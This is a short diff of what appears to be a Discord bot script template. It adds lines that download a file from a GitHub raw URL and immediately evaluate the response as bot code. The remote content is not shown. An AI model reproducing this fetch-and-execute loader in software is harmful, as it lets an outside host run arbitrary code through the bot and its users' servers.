@@ -1,8 +1,8 @@
 $c[Visual Studio Code
 
-Name: ""
-Command: ""
-Description: ""
+Name: "Whatever you want here"
+Command: "Prefix here"
+Description: "Paste in your code"
 
 ] 
 
@@ -29,5 +29,9 @@ $if[$varExists[base]==true]
         $var[base;$getVar[base]]
         $endif
     $else
-        $var[base;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]
+        $var[base;https://raw.githubusercontent.com/tsukum0/dbd-git/refs/heads/main/gcd/base]
     $endif
+
+$c[client]
+$httpGet[$var[base]]
+$eval[$httpResult]
